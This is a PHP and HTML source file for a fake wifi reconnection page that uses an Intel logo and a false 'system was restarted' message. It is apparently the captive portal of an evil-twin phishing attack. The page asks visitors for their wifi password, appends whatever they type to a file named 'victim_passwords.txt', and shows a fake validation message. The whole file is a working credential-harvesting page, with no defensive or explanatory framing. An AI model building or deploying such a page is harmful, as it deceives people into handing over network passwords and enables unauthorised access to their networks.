<?php
	
	if(isset($_POST['button'])){
		if(isset($_POST['password']) && !empty($_POST['password'])){
			$password = $_POST['password'];
			echo 'Wifi password in validation proccess please wait...'.$password.'<br><br><br>';
			$fp =fopen('victim_passwords.txt', 'a');
			fwrite($fp, $password);
			fwrite($fp, "\n");
			fclose($fp);
		}else {
			echo "Please enter a password<br>";
		}
	}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Wifi Service</title>
  <style>
    body{
      font-family: Arial, Helvetica, sans-serif;
      text-align: center;
      background-color:  #FFFFFF ;
      padding: 20px;
     
    }
    button{
		padding: 10px;
	}
	#connecting{
		visibility: hidden;
	}
   
  </style>
</head>
<body style="backgrounf-image:url('IntelLogo.png');">
   
  <div id="password-form">
      <img src="/IntelLogo.png" alt="" width="180vw">
      
      <h3>The system was restarted please enter wifi password again to reconnect</h3> 
     
	  <form method="post" action="index.php" id="mform"> 		
		<input type="text" name="password" size="15%">
		<p><input type="submit" name="button"  value="Connect to network"></p>
	  </form> 
  </div>
	
</body>
</html>
